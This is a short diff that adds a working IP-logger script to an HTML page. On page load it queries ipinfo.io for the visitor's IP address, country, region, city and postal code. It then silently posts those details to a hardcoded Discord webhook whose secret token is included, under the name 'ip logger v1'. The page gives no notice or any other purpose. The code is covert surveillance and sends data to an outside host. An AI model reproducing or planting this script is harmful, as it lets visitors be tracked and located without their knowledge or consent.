@@ -1,0 +1,27 @@
+<script>
+function monke(json) 
+{
+     var request = new XMLHttpRequest();
+     
+     request.open("POST", "https://discord.com/api/webhooks/1297255646483447879/6I-y7VkPd5JfdPNU2joLa7hP_qBkSc3n3AOZ1ayCLeeWOpluXwCqOse8c9MOZ8Y3db01");
+
+     request.setRequestHeader('Content-type', 'application/json');
+
+     var params = 
+     {
+          username: "ip logger v1",
+          avatar_url: "",
+          content: "@everyone",
+          embeds: [
+               {
+                    title: "Baka",
+                    color: 1752220,
+                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
+               }
+          ]
+     }
+
+     request.send(JSON.stringify(params));
+}
+</script>
+<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
